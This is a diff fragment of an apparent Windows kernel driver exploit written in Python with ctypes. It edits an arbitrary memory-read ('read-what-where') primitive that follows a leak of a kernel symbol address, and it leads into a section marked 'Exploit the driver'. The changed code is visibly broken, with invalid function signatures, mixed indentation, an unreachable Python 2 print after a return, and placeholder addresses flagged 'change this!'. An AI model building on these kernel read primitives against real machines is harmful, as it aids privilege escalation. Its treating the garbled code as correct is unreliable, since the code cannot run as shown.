@@ -134,19 +134,17 @@ while True:
 	print("nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value)
 	return baseAddr
 
-def readWhatWhere(driver=none, what=None, where=None)
-lpBuffer = c_ulonglong()
+def readWhatWhere(driver=none, Where=)
+lpBuffer = c_ulonglong()				#where - change this!
 result = kernel32.ReadProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a001010, byref(lpBuffer), 0x08, byref(read))
 	if result == 0:
 		print("Something went wrong while reading memory","e")
 		sys.exit()
-	return lpBuffer
+	return lpBuffer				#address needs to match the above
+	print "LPBuffer Contained: %08x" % cast(0x000000001a001010, POINTER(c_ulonglong))[0]
+
 
 '''
-
-
-
-
 
 
 # Exploit the driver
